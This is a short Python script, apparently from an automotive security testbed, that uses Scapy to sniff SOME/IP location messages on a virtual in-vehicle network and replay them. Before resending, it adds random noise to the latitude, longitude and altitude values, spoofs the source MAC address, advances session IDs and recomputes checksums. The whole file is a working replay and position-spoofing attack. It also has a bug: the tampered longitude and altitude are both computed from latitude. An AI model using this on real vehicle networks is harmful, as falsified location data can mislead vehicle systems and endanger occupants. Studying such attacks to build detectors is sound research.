from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
from common import Replay
import pdb
import time
import struct
import numpy as np

variables = [np.random.normal(0, 3) for _ in range(100)]
index = 0

def process_packet(packet):
    global index
    latitude, longitude, altitude = struct.unpack('>fff', bytes(packet[SOMEIP].payload))

    packets = []
    for _ in range(Replay.packet_series_count):
        latitude_tempered = latitude + variables[index]
        longitude_tempered = latitude + variables[index+1]
        altitude_tempered = latitude + variables[index+2]
        index += 3
        if index >= 95:
            index = 0
        data = struct.pack('>fff', latitude_tempered, longitude_tempered, altitude_tempered)
        packet[SOMEIP].payload = Raw(load=data)
        packet[IP].ttl = 5
        packet[Ether].src = '00:00:00:00:00:08'
        packet[SOMEIP].session_id += 10
        if packet[SOMEIP].session_id >= 65535:
            packet[SOMEIP].session_id = 1

        packet = update_udp_chksum(packet)
        packets.append(packet)
    print(f"[Replay] latitude_orig({latitude}), latitude_temp({latitude_tempered})")
    #print(f"[Replay] longitude_orig({longitude}), longitude_temp({longitude_tempered})")
    #print(f"[Replay] altitude_orig({altitude}), altitude_temp({altitude_tempered})")
    sendp(packets, iface='veth0.3', inter=Replay.location_interval)

filter = "udp and src host 10.0.3.8 and src port 31003"
sniff(filter=filter, iface='veth0.3', prn=process_packet)

